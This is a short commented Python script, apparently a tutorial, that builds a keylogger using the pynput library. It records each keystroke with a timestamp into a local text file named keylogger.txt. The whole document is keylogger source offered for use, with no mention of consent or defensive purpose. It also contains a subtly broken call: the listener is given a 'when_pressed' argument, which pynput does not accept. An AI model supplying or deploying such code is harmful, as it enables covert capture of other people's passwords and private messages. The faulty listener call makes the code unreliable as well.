# use the pip command in cmd in install pynput
# pynput allows us to see what keystrokes the user is making
from pynput.keyboard import Key, Listener
# Logging will log the individual keystrokes into a readable .txt file
import logging 
# To begin logging, a log function must be created
# the filename must be specified
logging.basicConfig(filename=("keylogger.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
# For this project, the keylog output file will be called "keylogger.txt" 
# The format by which the keystrokes will be stored must be specified 
def when_pressed(key):
    logging.info(str(key))
# A function that detects when a key has been pressed is created 
# The function takes the argument to show which key has been pressed by the user 
with Listener(when_pressed=when_pressed) as listener :
    listener.join()
# Create a listener that passes the function as an argument and join it to the main thread